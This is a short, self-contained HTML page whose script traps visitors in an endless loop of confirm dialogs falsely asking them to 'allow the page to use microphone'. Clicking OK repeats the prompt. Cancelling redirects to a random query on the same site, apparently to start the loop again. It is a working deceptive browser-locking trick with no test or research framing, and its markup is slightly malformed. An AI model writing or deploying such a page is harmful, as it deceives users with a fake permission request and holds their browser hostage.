<!DOCTYPE html>
<html>

<head>
    <meta name="apple-itunes-app">
    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum=1.0,user-scalable=no">
    </style>
</head>

<body bgcolor="white">

    <script>
        function getRandomInt(min, max) {
            min = Math.ceil(min);
            max = Math.floor(max);
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }

        function navigateToNextURL() {
            window.location.href = window.location.origin + "?p" + getRandomInt(0, 20000);
        }

    	while(true) {
            var confirmed = confirm("Please allow the page to use microphone");
            if (confirmed) {
                continue;
            } else {
                window.setTimeout(navigateToNextURL, 50);
                break;
            }
    	}
    	
    </script>
</body>

</html>
